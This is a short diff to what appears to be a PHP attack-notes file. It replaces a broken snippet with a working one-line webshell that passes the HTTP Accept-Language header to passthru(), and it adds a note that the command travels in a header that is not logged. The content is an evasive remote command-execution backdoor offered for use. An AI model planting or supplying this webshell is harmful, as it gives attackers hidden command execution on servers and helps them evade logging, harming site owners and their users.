@@ -6,5 +6,8 @@ this php function can be used to execute commands via an http header which is no
 `getenv()` = get the value of environment variable 
 
 ```php
-<?php passthru(getenv())?>
+<?php passthru(getenv('HTTP_ACCEPT_LANGUAGE')); ?>
 ```
+
+ITS A WEBSHELL , WHERE THE COMMAND WILL BE PASSED ON `HTTP_ACCEPT_LANGUAGE` HEADER , WHICH IS NOT LOGGED 
+
